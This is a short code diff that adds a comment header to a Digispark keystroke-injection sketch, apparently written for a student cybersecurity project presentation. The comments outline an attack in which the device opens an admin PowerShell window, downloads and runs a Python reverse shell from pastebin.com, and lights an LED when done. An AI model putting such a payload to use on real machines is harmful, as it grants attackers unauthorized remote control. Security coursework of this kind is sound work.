@@ -1,3 +1,9 @@
+// Powershell Version 1: written for Cybersecurity Project 4 Presentation
+//   1. Opens a very tiny Powershell window as Admin via 'taskmgr'
+//   2.  Close 'taskmgr', no longer needed.
+//   5. Downloads and runs a reverse shell (Python) script from pastebin.com.
+//   6. Turns on the LED signifying the script completed properly.
+
 #include "DigiKeyboard.h"
 #define KEY_TAB 0x2b
 
